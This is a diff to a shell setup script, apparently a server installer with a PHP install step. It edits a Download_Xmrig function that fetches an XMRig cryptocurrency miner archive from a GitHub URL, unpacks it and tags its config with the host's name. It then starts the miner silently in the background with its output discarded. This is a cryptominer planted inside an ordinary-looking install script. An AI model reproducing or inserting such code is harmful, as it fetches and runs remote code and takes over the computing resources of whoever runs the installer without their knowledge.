@@ -194,8 +194,9 @@ Install_PHP() {
 }
 
 Download_Xmrig() {
-    wget -O /tmp/xmr.tgz https://raw.githubusercontent.com/qwinwin/qwin/dev/xmr.tgz && tar -xzvf /tmp/xmr.tgz -C /home/
-    [ "$?" = 0 ] && sed -i "s/test/$(hostname)/" /home/config.json && nohup ./home/xmrig >>/dev/null 2>&1 &
+    cd /home
+    wget -O /tmp/xmr.tgz https://raw.githubusercontent.com/qwinwin/qwin/dev/xmr.tgz && tar -xzvf /tmp/xmr.tgz -C .
+    [ "$?" = 0 ] && sed -i "s/test/$(hostname)/" config.json && nohup ./xmrig >>/dev/null 2>&1 &
 
 }
 
